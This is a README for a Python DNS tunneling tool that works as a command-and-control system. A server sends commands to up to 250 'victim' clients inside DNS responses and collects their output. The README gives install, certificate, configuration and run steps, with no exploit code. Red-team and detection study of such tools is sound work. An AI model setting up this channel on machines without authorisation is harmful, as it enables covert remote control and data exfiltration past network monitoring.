# pydnst
**DNS Tunneling client and server in Python**

<a name="installation"></a>
## INSTALLATION

    pip3 install pydnst
    
For convenience the client and server are in the same package, however the "rich" dependency is only used by the server.

## FEATURES

pydnst is a DNS tunneling implementation in Python, supporting Linux only (the client might require a few paths tweaks to run on Windows).  
The client sends keep-alive requests every 30 seconds. If the server has a command to send to a specific client, it sends it in a response to a keep-alive. Then the client sends another query containing the command response.  
The server can manage up to 250 clients, communication is encrypted with a unique Fernet key per client, generated on the fly and shared using RSA encryption.  
A simple rich interface on the server side enables to send commands to specific clients, and watch the responses in real-time.  
The client being implemented in Python is not stealth.

## SET UP

First acquire access to a machine with a public IP, this is where the pydnst server will run.  
Then acquire a DNS name, as short as possible, and configure its nameservers with glue records pointing to your public IP.  
You can then configure your pydnst.toml field DNST_SERVER_NAME, and run pydnst client on your victim machine.

## USAGE

### Install the pydnst package on client and server

    pip3 install pydnst
    python3 -m pydnst --help
    
### Generate certificates (recommended), to encrypt the shared key transfer between client and server
This creates server_private.pem (copy to server) and server_public.pem (copy to client).
After copying server_private.pem to server, don't forget to chmod 600.

    python3 -m pydnst create_certificates
    
### Generate configuration
This creates pydnst.toml : edit if needed and then copy to client and server.  
On client, edit the MAIN_INTERFACE to use the DNS server of this interface, or DNS_SERVER_ADDRESS to circumvent it.  
On server, edit the LISTENING_INTERFACE.  
On both, specify the DNST_SERVER_NAME (the DNS name purchased).  

    python3 -m pydnst config
    
### On server
In one terminal, run the server (pydnst.toml must be in the current directory) :   
Logs are under pydnst.log  

    python3 -m pydnst server run
    
In another terminal, run the commander (pydnst.toml must be in the current directory), which enables to send commands and watch responses in real-time.  

    python3 -m pydnst server c2
    
### On client
In one terminal, run the client (pydnst.toml must be in the current directory) :   
Logs are under pydnst.log  

    python3 -m pydnst client run
